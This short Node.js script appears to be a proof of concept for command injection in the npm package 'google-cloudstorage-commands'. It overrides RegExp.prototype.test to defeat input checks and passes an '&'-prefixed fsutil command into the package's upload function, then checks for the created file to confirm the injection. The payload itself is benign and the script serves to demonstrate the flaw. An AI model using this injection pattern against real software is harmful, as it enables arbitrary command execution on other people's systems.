RegExp.prototype.test = () => false;
var root = require('google-cloudstorage-commands');
const fs = require('fs');
const path = './google-cloudstorage-commands';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(root.upload('./', '& fsutil file createnew google-cloudstorage-commands 0', true).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));